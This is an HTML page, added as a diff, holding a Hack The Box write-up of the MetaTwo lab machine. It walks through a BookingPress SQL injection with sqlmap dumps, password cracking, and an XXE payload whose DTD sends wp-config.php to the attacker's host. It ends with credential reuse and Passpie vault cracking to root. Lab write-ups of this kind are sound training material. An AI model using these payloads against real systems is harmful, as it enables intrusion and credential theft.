@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+  <title>MetaTwo | Hack The Box Writeup</title>
+  <meta name="description"
+    content="MetaTwo HTB walkthrough covering WordPress enumeration, BookingPress SQL injection, XXE, FTP credential disclosure, SSH access, Passpie, and Linux privilege escalation.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link href="../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="../assets/css/main.css?v=20260512-toc-indicator" rel="stylesheet">
+</head>
+
+<body>
+  <main class="main">
+    <section class="section">
+      <div class="container writeup-detail">
+        <article class="detail-box">
+          <div class="writeup-detail-header">
+            <a class="back-link top" href="../index.html#writeups">Back to Writeups</a>
+          </div>
+
+          <h1>MetaTwo</h1>
+          <div class="writeup-platform detail"><i class="bi bi-terminal" aria-hidden="true"></i><span>Hack The Box</span></div>
+          <div class="tag-list">
+            <span class="tag">Red Team</span>
+            <span class="tag">Easy</span>
+            <span class="tag">Linux</span>
+            <span class="tag">WordPress</span>
+            <span class="tag">SQL Injection</span>
+            <span class="tag">XXE</span>
+            <span class="tag">FTP</span>
+            <span class="tag">Credential Exposure</span>
+            <span class="tag">Password Cracking</span>
+            <span class="tag">Credential Reuse</span>
+            <span class="tag">Lateral Movement</span>
+            <span class="tag">Privilege Escalation</span>
+            <span class="tag">Passpie</span>
+          </div>
+
+          <h2>Overview</h2>
+          <p>
+            MetaTwo is an easy Linux machine from Hack The Box built around a WordPress compromise. The initial path uses a
+            time-based SQL injection in BookingPress to recover a restricted WordPress account. That account can upload media,
+            enabling an XXE vulnerability that exposes <code>wp-config.php</code> and FTP credentials. Further credential
+            discovery leads to SSH access as <code>jnelson</code>, while a local Passpie vault provides the route to root.
+          </p>
+          <p>
+            The machine demonstrates how several limited findings - a vulnerable plugin, restricted media access, configuration
+            disclosure, and reused credentials - can be chained into complete host compromise.
+          </p>
+
+          <h2>1. Reconnaissance</h2>
+          <p>I began with a full TCP scan against the target.</p>
+          <pre><code class="language-bash">nmap -p- --min-rate 5000 -T4 -Pn 10.129.228.95</code></pre>
+          <pre><code class="language-text">Nmap scan report for 10.129.228.95
+Host is up (0.0074s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/01-port-scan.png" alt="Nmap scan showing FTP, SSH, and HTTP open on MetaTwo">
+            <figcaption>The initial scan exposed FTP, SSH, and HTTP.</figcaption>
+          </figure>
+          <p>The web server redirected requests to <code>metapress.htb</code>, so I added the hostname locally.</p>
+          <pre><code class="language-bash">echo "10.129.228.95 metapress.htb" | sudo tee -a /etc/hosts</code></pre>
+          <pre><code class="language-text">10.129.228.95 metapress.htb</code></pre>
+
+          <h2>2. WordPress Enumeration</h2>
+          <p>The website identified itself as MetaPress and linked to an events page.</p>
+          <figure>
+            <img src="../assets/img/MetaTwo/02-metapress-homepage.png" alt="MetaPress WordPress home page linking to the events area">
+            <figcaption>The public site linked directly to the event booking functionality.</figcaption>
+          </figure>
+          <pre><code class="language-bash">curl -s http://metapress.htb/ | grep -Ei 'wp-content|wp-includes|plugin|theme|generator|form|action|href'</code></pre>
+          <p>I combined direct REST API enumeration with WPScan.</p>
+          <pre><code class="language-bash">curl -s http://metapress.htb/wp-json/wp/v2/users</code></pre>
+          <pre><code class="language-bash">wpscan --url http://metapress.htb --enumerate ap,at,u</code></pre>
+          <pre><code class="language-text">WordPress: 5.6.2
+PHP: 8.0.24
+Server: nginx/1.18.0
+Users: admin, manager
+XML-RPC: enabled
+Theme: twentytwentyone 1.1</code></pre>
+
+          <h2>3. BookingPress Discovery</h2>
+          <p>
+            The <code>/events/</code> page loaded BookingPress Appointment Booking 1.0.10. Its client-side code exposed the
+            WordPress AJAX endpoint, action name, controllable parameters, and a nonce.
+          </p>
+          <pre><code class="language-text">Plugin: bookingpress-appointment-booking
+Version: 1.0.10
+Endpoint: /wp-admin/admin-ajax.php
+Action: bookingpress_front_get_category_services
+Parameters: category_id, total_service, _wpnonce</code></pre>
+          <p>I first reproduced a normal request to confirm the expected application flow.</p>
+          <pre><code class="language-bash">curl -s -X POST http://metapress.htb/wp-admin/admin-ajax.php \
+  -d "action=bookingpress_front_get_category_services" \
+  -d "category_id=1" \
+  -d "total_service=" \
+  -d "_wpnonce=4a7a2fdd3c"</code></pre>
+          <pre><code class="language-text">Service ID: 1
+Service name: Startup meeting
+Duration: 30 minutes
+Price: $0.00</code></pre>
+
+          <h2>4. Time-Based SQL Injection</h2>
+          <p>
+            BookingPress 1.0.10 is affected by CVE-2022-0739. I tested the <code>total_service</code> parameter with a five-second
+            delay and measured the complete request time.
+          </p>
+          <pre><code class="language-bash">time curl -s -X POST http://metapress.htb/wp-admin/admin-ajax.php \
+  -d "action=bookingpress_front_get_category_services" \
+  -d "category_id=1" \
+  -d "total_service=1) AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -" \
+  -d "_wpnonce=4a7a2fdd3c"</code></pre>
+          <pre><code class="language-text">real    0m5.137s
+user    0m0.075s
+sys     0m0.007s</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/03-bookingpress-sqli-timing.png" alt="Five-second response delay confirming SQL injection in BookingPress">
+            <figcaption>The observed response time closely matched the injected five-second database delay.</figcaption>
+          </figure>
+          <p>The timing difference confirmed that attacker-controlled SQL reached the database.</p>
+
+          <h2>5. SQLMap Database Enumeration</h2>
+          <p>I used SQLMap to confirm the injection and identify the active database.</p>
+          <pre><code class="language-bash">sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" \
+  --data="action=bookingpress_front_get_category_services&amp;category_id=1&amp;total_service=1&amp;_wpnonce=4a7a2fdd3c" \
+  -p total_service \
+  --technique=T \
+  --dbms=mysql \
+  --time-sec=5 \
+  --current-db</code></pre>
+          <pre><code class="language-text">POST parameter 'total_service' is vulnerable.
+Type: time-based blind
+Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+current database: 'blog'</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/04-sqlmap-current-database.png" alt="SQLMap identifying the current WordPress database as blog">
+            <figcaption>SQLMap confirmed time-based blind SQL injection and identified the <code>blog</code> database.</figcaption>
+          </figure>
+          <p>I then listed the databases visible to the application user.</p>
+          <pre><code class="language-bash">sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" \
+  --data="action=bookingpress_front_get_category_services&amp;category_id=1&amp;total_service=1&amp;_wpnonce=4a7a2fdd3c" \
+  -p total_service --technique=T --dbms=mysql --time-sec=5 --dbs</code></pre>
+          <pre><code class="language-text">available databases [2]:
+[*] blog
+[*] information_schema</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/05-sqlmap-database-enumeration.png" alt="SQLMap listing the blog and information_schema databases">
+            <figcaption>The application database was the only non-system database exposed to the compromised account.</figcaption>
+          </figure>
+
+          <h2>6. WordPress Credential Extraction</h2>
+          <p>The <code>wp_users</code> table contained the usernames and phpass password hashes.</p>
+          <pre><code class="language-bash">sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" \
+  --data="action=bookingpress_front_get_category_services&amp;category_id=1&amp;total_service=1&amp;_wpnonce=4a7a2fdd3c" \
+  -p total_service --technique=T --dbms=mysql \
+  -D blog -T wp_users -C user_login,user_pass --dump</code></pre>
+          <pre><code class="language-text">Database: blog
+Table: wp_users
+
+manager  $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
+admin    $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/06-wordpress-user-hashes.png" alt="SQLMap output containing manager and admin WordPress password hashes">
+            <figcaption>The vulnerable query exposed both WordPress usernames and their stored password hashes.</figcaption>
+          </figure>
+          <p>I saved both hashes and used Hashcat's phpass mode with the RockYou wordlist.</p>
+          <pre><code class="language-bash">hashcat -m 400 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/07-hashcat-running.png" alt="Hashcat processing the extracted WordPress phpass hashes">
+            <figcaption>Hashcat processed the two WordPress hashes using mode 400.</figcaption>
+          </figure>
+          <pre><code class="language-bash">hashcat -m 400 hashes.txt --show</code></pre>
+          <pre><code class="language-text">$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/08-hashcat-cracked-password.png" alt="Hashcat showing the recovered manager password">
+            <figcaption>The recovered hash mapped to <code>manager : partylikearockstar</code>.</figcaption>
+          </figure>
+
+          <h2>7. Authenticated WordPress Access</h2>
+          <p>The recovered credentials successfully authenticated to WordPress.</p>
+          <pre><code class="language-text">Username: manager
+Password: partylikearockstar</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/09-wordpress-login.png" alt="WordPress login form using the recovered manager credentials">
+            <figcaption>The cracked password provided access to the manager account.</figcaption>
+          </figure>
+          <p>
+            The account was not an administrator. Its visible capabilities were limited to the dashboard, profile, media
+            library, and media uploads; plugin, user, theme, settings, and tools pages were denied.
+          </p>
+          <pre><code class="language-text">Allowed: Dashboard, Media Library, Upload New Media, Profile
+Denied: Plugins, Users, Themes, Settings, Tools</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/10-manager-profile.png" alt="Restricted WordPress manager profile with media access">
+            <figcaption>The restricted role still retained the media-upload capability needed for the next stage.</figcaption>
+          </figure>
+
+          <h2>8. Media Upload and XXE</h2>
+          <p>
+            WordPress 5.6.2 with PHP 8 was vulnerable to CVE-2021-29447. A crafted WAV file could include XML metadata that
+            loaded an external DTD. I started a web server to host the DTD and receive callbacks.
+          </p>
+          <pre><code class="language-bash">mkdir -p ~/xxe</code></pre>
+          <pre><code class="language-bash">cd ~/xxe</code></pre>
+          <pre><code class="language-bash">python3 -m http.server 8000</code></pre>
+          <p>The first DTD only tested whether the target would resolve an external entity.</p>
+          <pre><code class="language-xml">&lt;!ENTITY % test SYSTEM "http://10.10.15.9:8000/xxe-confirmed"&gt;
+%test;</code></pre>
+          <pre><code class="language-text">10.129.228.95 "GET /evil.dtd HTTP/1.1" 200
+10.129.228.95 "GET /xxe-confirmed HTTP/1.1" 404</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/11-xxe-callback.png" alt="HTTP server receiving callbacks from the WordPress XXE payload">
+            <figcaption>The target fetched the external DTD and made the second callback, confirming XXE.</figcaption>
+          </figure>
+
+          <h2>9. Reading wp-config.php</h2>
+          <p>I changed the DTD to read and Base64-encode <code>wp-config.php</code>, then send the result back in a request.</p>
+          <pre><code class="language-xml">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php"&gt;
+&lt;!ENTITY % init "&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.15.9:8000/?p=%file;'&gt;" &gt;</code></pre>
+          <pre><code class="language-text">GET /evil.dtd HTTP/1.1 200
+GET /?p=PD9waHANCi8qKiBUaGUg... HTTP/1.1 200</code></pre>
+          <p>I decoded the returned value and inspected the relevant configuration entries.</p>
+          <pre><code class="language-bash">base64 -d wpconfig.b64 &gt; wp-config.php</code></pre>
+          <pre><code class="language-bash">grep -E "DB_|FTP_|FS_METHOD" wp-config.php</code></pre>
+          <pre><code class="language-text">FTP_HOST: ftp.metapress.htb
+FTP_USER: metapress.htb
+FTP_PASS: 9NYS_ii@FyL_p5M2NvJ</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/12-wordpress-config-disclosure.png" alt="Decoded wp-config.php exposing WordPress and FTP configuration">
+            <figcaption>The XXE file read exposed FTP credentials from <code>wp-config.php</code>.</figcaption>
+          </figure>
+
+          <h2>10. FTP Access</h2>
+          <p>I added the FTP hostname locally and authenticated with the recovered configuration credentials.</p>
+          <pre><code class="language-bash">echo "10.129.228.95 ftp.metapress.htb" | sudo tee -a /etc/hosts</code></pre>
+          <pre><code class="language-bash">ftp ftp.metapress.htb</code></pre>
+          <pre><code class="language-text">Name: metapress.htb
+Password: 9NYS_ii@FyL_p5M2NvJ
+230 User metapress.htb logged in</code></pre>
+          <pre><code class="language-text">drwxr-xr-x  blog
+drwxr-xr-x  mailer</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/13-ftp-access.png" alt="Authenticated FTP session showing the blog and mailer directories">
+            <figcaption>The WordPress configuration credentials opened the FTP service and exposed the mailer directory.</figcaption>
+          </figure>
+
+          <h2>11. Mailer Credential Discovery</h2>
+          <p>The custom mailer directory contained <code>send_email.php</code>.</p>
+          <pre><code class="language-text">ftp&gt; cd mailer
+ftp&gt; get send_email.php
+ftp&gt; bye</code></pre>
+          <pre><code class="language-bash">cat send_email.php</code></pre>
+          <pre><code class="language-php">$mail-&gt;Host = "mail.metapress.htb";
+$mail-&gt;SMTPAuth = true;
+$mail-&gt;Username = "jnelson@metapress.htb";
+$mail-&gt;Password = "Cb4_JmWM8zUZWMu@Ys";
+$mail-&gt;SMTPSecure = "tls";
+$mail-&gt;Port = 587;</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/14-mailer-credentials.png" alt="Mailer PHP source exposing jnelson SMTP credentials">
+            <figcaption>Hardcoded SMTP credentials in the mailer source identified the local user <code>jnelson</code>.</figcaption>
+          </figure>
+
+          <h2>12. SSH as jnelson</h2>
+          <p>The SMTP password was reused by the Linux account and provided SSH access.</p>
+          <pre><code class="language-bash">ssh jnelson@10.129.228.95</code></pre>
+          <pre><code class="language-text">jnelson@10.129.228.95's password: Cb4_JmWM8zUZWMu@Ys
+Linux meta2 5.10.0-19-amd64
+jnelson@meta2:~$</code></pre>
+          <pre><code class="language-bash">id</code></pre>
+          <pre><code class="language-text">uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)</code></pre>
+          <pre><code class="language-bash">cat user.txt</code></pre>
+          <pre><code class="language-text">920f5ac091d5f63075377a29dc5a6e54</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/15-ssh-user-flag.png" alt="SSH session as jnelson showing identity and the user flag">
+            <figcaption>Credential reuse provided a host shell and the user flag.</figcaption>
+          </figure>
+
+          <h2>13. Passpie Discovery</h2>
+          <p><code>jnelson</code> had no sudo privileges, and standard SUID enumeration did not reveal a custom binary.</p>
+          <pre><code class="language-bash">sudo -l</code></pre>
+          <pre><code class="language-text">Sorry, user jnelson may not run sudo on meta2.</code></pre>
+          <p>Home-directory enumeration revealed a Passpie password vault.</p>
+          <pre><code class="language-bash">ls -la ~/.passpie</code></pre>
+          <pre><code class="language-bash">passpie list</code></pre>
+          <pre><code class="language-text">Name  Login    Password
+ssh   jnelson  ********
+ssh   root     ********</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/16-passpie-vault.png" alt="Passpie vault listing SSH credentials for jnelson and root">
+            <figcaption>The local password manager contained an encrypted SSH credential for root.</figcaption>
+          </figure>
+
+          <h2>14. Encrypted Root Credential</h2>
+          <p>The root entry was protected as a PGP message.</p>
+          <pre><code class="language-bash">cat ~/.passpie/ssh/root.pass</code></pre>
+          <pre><code class="language-text">login: root
+name: ssh
+password:
+-----BEGIN PGP MESSAGE-----
+...
+-----END PGP MESSAGE-----</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/17-passpie-root-entry.png" alt="Passpie root password entry stored as an encrypted PGP message">
+            <figcaption>The root password existed in the vault but required the Passpie master passphrase.</figcaption>
+          </figure>
+          <p>The vault's <code>.keys</code> file contained both public and passphrase-protected private PGP key blocks.</p>
+
+          <h2>15. Cracking the Master Passphrase</h2>
+          <p>I copied the Passpie key file to my attack system.</p>
+          <pre><code class="language-bash">scp jnelson@10.129.228.95:/home/jnelson/.passpie/.keys passpie.keys</code></pre>
+          <p><code>gpg2john</code> needed only the private key block, so I extracted it before conversion.</p>
+          <pre><code class="language-bash">sed -n '/-----BEGIN PGP PRIVATE KEY BLOCK-----/,/-----END PGP PRIVATE KEY BLOCK-----/p' \
+  passpie.keys &gt; private.key</code></pre>
+          <pre><code class="language-bash">gpg2john private.key &gt; passpie.hash</code></pre>
+          <pre><code class="language-bash">john --wordlist=/usr/share/wordlists/rockyou.txt passpie.hash</code></pre>
+          <pre><code class="language-text">blink182  (Passpie)</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/18-passpie-master-key-cracking.png" alt="John the Ripper recovering the Passpie master passphrase">
+            <figcaption>John recovered the Passpie master passphrase <code>blink182</code>.</figcaption>
+          </figure>
+
+          <h2>16. Exporting the Root Password</h2>
+          <p>With the master passphrase, Passpie could decrypt and export the stored credentials.</p>
+          <pre><code class="language-bash">passpie export /tmp/passpie.txt</code></pre>
+          <pre><code class="language-text">Passphrase: blink182</code></pre>
+          <pre><code class="language-bash">cat /tmp/passpie.txt</code></pre>
+          <pre><code class="language-text">root@ssh
+login: root
+password: p7qfAZt4_A1xo_0x
+
+jnelson@ssh
+login: jnelson
+password: Cb4_JmWM8zUZWMu@Ys</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/19-passpie-export.png" alt="Decrypted Passpie export containing the root and jnelson passwords">
+            <figcaption>The decrypted vault revealed the root account password.</figcaption>
+          </figure>
+
+          <h2>17. Root Access</h2>
+          <p>I switched to the root account using the recovered password.</p>
+          <pre><code class="language-bash">su -</code></pre>
+          <pre><code class="language-text">Password: p7qfAZt4_A1xo_0x</code></pre>
+          <pre><code class="language-bash">whoami</code></pre>
+          <pre><code class="language-text">root</code></pre>
+          <pre><code class="language-bash">id</code></pre>
+          <pre><code class="language-text">uid=0(root) gid=0(root) groups=0(root)</code></pre>
+          <pre><code class="language-bash">cat /root/root.txt</code></pre>
+          <pre><code class="language-text">12d11d832dcf9150bfcfa9e6b5ee6005</code></pre>
+          <figure>
+            <img src="../assets/img/MetaTwo/20-root-access.png" alt="Root shell on MetaTwo showing identity and the root flag">
+            <figcaption>The recovered Passpie credential completed the machine with full root access.</figcaption>
+          </figure>
+
+          <h2>Attack Chain</h2>
+          <ol>
+            <li>Enumerated FTP, SSH, and the MetaPress WordPress site.</li>
+            <li>Identified BookingPress 1.0.10 and reproduced its AJAX request.</li>
+            <li>Exploited CVE-2022-0739 to extract WordPress password hashes.</li>
+            <li>Cracked the manager password and authenticated to the restricted account.</li>
+            <li>Used its media-upload permission to exploit CVE-2021-29447.</li>
+            <li>Read <code>wp-config.php</code> through XXE and recovered FTP credentials.</li>
+            <li>Found hardcoded jnelson credentials in the FTP-hosted mailer source.</li>
+            <li>Reused those credentials for SSH and obtained the user flag.</li>
+            <li>Discovered a Passpie vault containing an encrypted root credential.</li>
+            <li>Cracked the vault master passphrase and exported the root password.</li>
+            <li>Switched to root and retrieved the final flag.</li>
+          </ol>
+
+          <h2>Key Takeaways</h2>
+          <ul>
+            <li>Manual request reproduction makes it easier to understand and validate plugin vulnerabilities.</li>
+            <li>A restricted WordPress role can still be dangerous when its remaining capability reaches a vulnerable parser.</li>
+            <li>Configuration files often bridge application compromise to infrastructure credentials.</li>
+            <li>Credentials recovered for one service should be assessed for reuse across other exposed services.</li>
+            <li>Local password managers are high-value enumeration targets, but their encryption still needs to be defeated.</li>
+            <li>The full compromise required chaining several individually limited weaknesses rather than relying on one direct exploit.</li>
+          </ul>
+
+          <a class="back-link bottom" href="../index.html#writeups">Back to Writeups</a>
+        </article>
+      </div>
+    </section>
+  </main>
+  <script src="../assets/js/main.js?v=20260514-writeup-toc-bottom" defer></script>
+</body>
+
+</html>
